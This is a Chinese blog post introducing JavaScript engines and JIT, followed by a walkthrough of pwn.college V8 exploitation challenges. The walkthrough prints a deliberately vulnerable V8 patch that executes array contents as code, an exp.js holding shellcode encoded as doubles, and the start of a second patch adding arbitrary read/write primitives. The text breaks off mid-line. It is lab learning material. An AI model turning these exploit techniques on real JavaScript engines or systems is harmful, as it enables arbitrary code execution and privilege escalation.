<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="逝者如斯夫，不舍昼夜">
<meta property="og:type" content="website">
<meta property="og:title" content="No_t1me&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="No_t1me&#39;s blog">
<meta property="og:description" content="逝者如斯夫，不舍昼夜">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="no_t1me">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>No_t1me's blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  






  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">No_t1me's blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">lost in binary</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">no_t1me</p>
  <div class="site-description" itemprop="description">逝者如斯夫，不舍昼夜</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/No-t1me" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;No-t1me" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:birty073@126.com" title="email → mailto:birty073@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>email</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          友情链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://ret2ldz.github.io/" title="https:&#x2F;&#x2F;ret2ldz.github.io" rel="noopener" target="_blank">ldz</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://www.jimmmmmiesblog.cn/" title="https:&#x2F;&#x2F;www.jimmmmmiesblog.cn" rel="noopener" target="_blank">Jimmy</a>
            </li>
            <li class="links-of-blogroll-item">
              <a href="https://aucept.in/" title="https:&#x2F;&#x2F;aucept.in" rel="noopener" target="_blank">Auceptin</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/25/JS%E5%BC%95%E6%93%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/25/JS%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">JS引擎</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-12-25 14:01:33" itemprop="dateCreated datePublished" datetime="2025-12-25T14:01:33+08:00">2025-12-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2026-01-21 16:09:36" itemprop="dateModified" datetime="2026-01-21T16:09:36+08:00">2026-01-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>前段时间看到pwn比赛中有考察到js引擎的题目，本人打算学习了解一下。主打一个广涉猎，在每个方向的深度方面可能还需要在后续的做题过程中积累。。。。</p>
<h2 id="什么是”引擎”？"><a href="#什么是”引擎”？" class="headerlink" title="什么是”引擎”？"></a>什么是”引擎”？</h2><p>这里用引擎描述还是非常形象的，即将js代码“发动”起来（准确地给出代码运行结果的一段程序）的工具。我看到这段第一反应是：这不就是编译器吗？但是要注意，javascript是动态语言。对于动态语言来说，让其从源代码文件到可以跑起来的字节码的工具叫做<strong>解释器（Interpreter）</strong></p>
<p>区别：</p>
<ul>
<li><strong>编译器是将源代码编译为另外一种代码（比如机器码，或者字节码）</strong></li>
<li><strong>解释器是直接解析并将代码运行结果输出</strong>。 比方说，firebug的console就是一个JavaScript的解释器。</li>
</ul>
<blockquote>
<p>解释型语言：程序不需要编译，程序在运行的过程中才用解释器编译成机器语言，边编译边执行，不会产生可执行的字节码文件</p>
<p>但是，现在很难去界定说，JavaScript引擎到底算是解释器还是编译器，因为，比如像<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=106846137&content_type=Article&match_order=1&q=V8&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjY4MTQ5NDYsInEiOiJWOCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjEwNjg0NjEzNywiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.FDUBSVbzgqyjhxMYYx6_QdVq3z921mElAi3CnByOluE&zhida_source=entity">V8</a>（Chrome的JS引擎），它其实为了提高 JS的运行性能，在运行之前会先将JS编译为本地的机器码（native machine code），然后再去执行机器码（这样速度就快很多）</p>
<p>JIT（Just In Time Compilation）：解决解释性语言的性能问题，主要思想是当解释器将源代码解释成内部表示的时候（类似于java字节码），JavaScript的执行环境不仅是解释这些内部表示，而且将其中一些字节码（使用率高的部分）转成本地代码（汇编代码），这样就可以被CPU直接执行，而不是解释执行，从而提高性能。</p>
<p>工作流水线:<code>字节码 → 解释器执行 → 热点探测 → JIT 编译 → 本地代码缓存 → 后续直接跳转</code></p>
</blockquote>
<h3 id="引擎的组成"><a href="#引擎的组成" class="headerlink" title="引擎的组成"></a>引擎的组成</h3><ul>
<li>编译器。主要工作是将源代码编译成抽象语法树，然后在某些引擎中还包含将抽象语法树转换成字节码</li>
<li>解释器。在某些引擎中，解释器主要是接受字节码，解释执行这个字节码，然后也依赖回收机制等</li>
<li>JIT工具。一个能够JIT的工具，将字节码或者抽象语法树转换成本地代码</li>
<li>垃圾回收器和分析工具（profiler）。它们负责垃圾回收和收集引擎中的信息，帮助改善引擎的性能和功效</li>
</ul>
<h3 id="题目形式"><a href="#题目形式" class="headerlink" title="题目形式"></a>题目形式</h3><p>通常会在文件中给出特定的patch修改文件，同时给出已经运用该引擎的对应js引擎。作为攻击者，我们需要利用js代码利用patch的地方(通常存在漏洞)来达到提权的目的。创建exp.js，利用引擎解析该js文件，触发漏洞，提权&#x2F;获得flag</p>
<h2 id="pwncollege-V8-exploitation"><a href="#pwncollege-V8-exploitation" class="headerlink" title="pwncollege V8 exploitation"></a>pwncollege V8 exploitation</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>第一步确定题目patch的地方，patch文件：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index ea45a7ada6b..c840e568152 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -24,6 +24,8 @@</span></span><br><span class="line"> #include &quot;src/objects/prototype.h&quot;</span><br><span class="line"> #include &quot;src/objects/smi.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern &quot;C&quot; void *mmap(void *, unsigned long, int, int, int, int);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace v8 &#123;</span><br><span class="line"> namespace internal &#123;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -407,6 +409,47 @@</span> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> // 这里声明新增加的java原生方法：array.run()</span><br><span class="line"><span class="addition">+BUILTIN(ArrayRun) &#123;</span></span><br><span class="line"><span class="addition">+  HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">+  Factory *factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; receiver = args.receiver();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;Nope&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Cast&lt;JSArray&gt;(receiver);</span></span><br><span class="line"><span class="addition">+  ElementsKind kind = array-&gt;GetElementsKind();		//获取数组元素</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (kind != PACKED_DOUBLE_ELEMENTS) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;Need array of double numbers&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t length = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));	//获取长度</span></span><br><span class="line"><span class="addition">+  if (sizeof(double) * (uint64_t)length &gt; 4096) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;array too long&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line"><span class="addition">+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);</span></span><br><span class="line"><span class="addition">+  if (mem == (double *)-1) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;mmap failed&quot;)));</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;FixedDoubleArray&gt; elements(Cast&lt;FixedDoubleArray&gt;(array-&gt;elements()), isolate);</span></span><br><span class="line"><span class="addition">+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i &lt; length, i++, &#123;</span></span><br><span class="line"><span class="addition">+    double x = elements-&gt;get_scalar(i);</span></span><br><span class="line"><span class="addition">+    mem[i] = x;</span></span><br><span class="line"><span class="addition">+  &#125;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  ((void (*)())mem)();</span></span><br><span class="line"><span class="addition">+  return 0;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Tagged&lt;Object&gt; GenericArrayPop(Isolate* isolate,</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line"><span class="comment">index 48249695b7b..40a762c24c8 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2533,6 +2533,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line"> </span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;at&quot;, Builtin::kArrayPrototypeAt, 1,</span><br><span class="line">                           true);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;run&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtin::kArrayRun, 0, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;concat&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeConcat, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,</span><br><span class="line">     </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 78cbf8874ed..4f3d885cca7 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -421,6 +421,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">   /* ES6 #sec-array.prototype.push */                                          \</span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line"><span class="addition">+  CPP(ArrayRun)                                                                \</span></span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>V8 挂方法的“模板公式”</strong></p>
<ol>
<li>在 <code>builtins-definitions.h</code> 加<br> <code>CPP(YourBuiltin)</code></li>
<li>在 <code>builtins-xxx.cc</code> 写实现<br> <code>BUILTIN(YourBuiltin) { ... }</code></li>
<li>在 <code>bootstrapper.cc</code> 挂原型<br> <code>SimpleInstallFunction(isolate_, proto, &quot;js方法名&quot;, Builtin::kYourBuiltin, 参数个数, 是否adapt);</code></li>
</ol>
</blockquote>
<p>这段patch其实就是为v8引擎新增了一个识别array.run()方法的功能，对应实现<code>ArrayRun</code>本质上申请一片rwx内存，将array内存的double类型值依次存入，其中会检查类型是否为double以及长度限制。然后直接跳到内存开始处执行。非常简单粗暴，思路也很简单，直接借助强大的python写double类型的shellcode，然后在js文件run对应的double类型的array，即可执行任意代码。</p>
<p>这里存在一点需要注意的，在执行这段shellcode时， RUID!&#x3D;EUID&#x3D;&#x3D;root。</p>
<p><img src="/2025/12/25/JS%E5%BC%95%E6%93%8E/3.png"></p>
<p>这里如果直接execve(‘&#x2F;bin&#x2F;sh’)的话，在某些安全配置下，如果检测到其实时RUID !&#x3D; EUID（例如，从setuid程序启动），<strong>会主动丢弃特权，将EUID重置为RUID</strong>，这是一种安全保护。在题目环境下会导致权限丢失。那么稳妥的方法是直接执行能够得到flag的文件，刚好题目给了一个catflag文件，非常巧的是(其实是故意设计的)：catflag的关联组与EUID相同，那么直接执行即可。</p>
<p><img src="/2025/12/25/JS%E5%BC%95%E6%93%8E/2.png"></p>
<p>Exp.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">2.6774523096502052e+156</span>,</span><br><span class="line">    <span class="number">7.811264351351817e-304</span>,</span><br><span class="line">    <span class="number">5.9243877051804356e+169</span>,</span><br><span class="line">    <span class="number">8.19170178617048e-79</span>,</span><br><span class="line">    <span class="number">2.8157102738592843e+79</span>,</span><br><span class="line">    <span class="number">1.5438141419276312e-307</span>,</span><br><span class="line">    <span class="number">4.19309166e-316</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>依旧先看patch文件：</p>
<p>patch</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index facf0d86d79..6b31fe2c371 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -1283,6 +1283,64 @@</span> struct ModuleResolutionData &#123;</span><br><span class="line"> </span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line"><span class="addition">+void Shell::GetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (info.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+  if (!IsHeapObject(*arg)) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  internal::Tagged&lt;internal::HeapObject&gt; obj = internal::Cast&lt;internal::HeapObject&gt;(*arg);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint32_t address = static_cast&lt;uint32_t&gt;(obj-&gt;address());</span></span><br><span class="line"><span class="addition">+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void Shell::ArbRead32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+       Isolate *isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+       if (info.Length() != 1) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Need exactly one argument&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+       if (!IsNumber(*arg)) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Argument should be a number&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span></span><br><span class="line"><span class="addition">+       internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span></span><br><span class="line"><span class="addition">+       uint32_t addr = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg));</span></span><br><span class="line"><span class="addition">+       uint64_t full_addr = base_addr + (uint64_t)addr;</span></span><br><span class="line"><span class="addition">+       uint32_t result = *(uint32_t *)full_addr;</span></span><br><span class="line"><span class="addition">+       info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void Shell::ArbWrite32(const 